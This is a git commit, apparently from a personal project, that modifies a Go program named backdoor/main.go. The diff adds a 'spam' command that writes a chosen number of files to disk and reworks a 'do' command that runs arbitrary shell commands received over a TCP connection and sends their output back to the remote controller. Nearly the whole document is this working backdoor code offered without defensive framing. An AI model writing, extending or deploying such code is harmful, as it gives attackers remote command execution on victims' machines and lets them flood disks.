f3378b6addcd7ec172cfe1ade56457efde9a5b09
Staś <45013739+stashito@users.noreply.github.com>
2020-12-16 22:06:20 -0600

    add spam

--- backdoor/main.go
+++ backdoor/main.go
@@ -7,6 +7,8 @@ import (
         "os"
         "strings"
         "os/exec"
+        "io/ioutil"
+        "strconv"
 )
 
 func command(cmd string) string {
@@ -37,26 +39,47 @@ func main() {
         for {
           message, _ := bufio.NewReader(c).ReadString('\n')
 
-
           if strings.TrimSpace(string(message)) == "STOP" {
             fmt.Println("TCP client exiting...")
             fmt.Fprintf(c, "STOP")
             return
           }
 
-          output := command(strings.TrimSpace(message))
-          if output == "nil" {
-            return
-            } else {
-              message = output
-            }
+          var output string
 
+          words := strings.Split(string(message), " ")
+
+          if words[0] == "spam" {
+            words[1] = strings.TrimSpace(string(words[1]))
+            n, err := strconv.Atoi(words[1])
+            if err != nil {
+              fmt.Println(err)
+              return
+            }
+            for i:=0; i < n+1; i++ {
+              err := ioutil.WriteFile(strconv.Itoa(i) + "file.txt", []byte("Hello"), 0755)
+              if err != nil {
+                fmt.Print("[-] Failed to write file")
+              }
+            }
+          }
+
+          if words[0] == "do" {
+
+            msg := []rune(message)
+            cmd := string(msg[3:len(message)])
+            fmt.Println(cmd)
+            output = command(strings.TrimSpace(cmd))
+            if output == "nil" {
+              return
+              }
             fmt.Println(output)
             output = strings.Replace(output, "\n", " ", -1)
-            fmt.Fprintf(c, output+"\n")
-            // fmt.Print("->: " + message)
+          }
 
-            iter++
+          fmt.Fprintf(c, output+"\n")
+
+          iter++
 
         }
 }
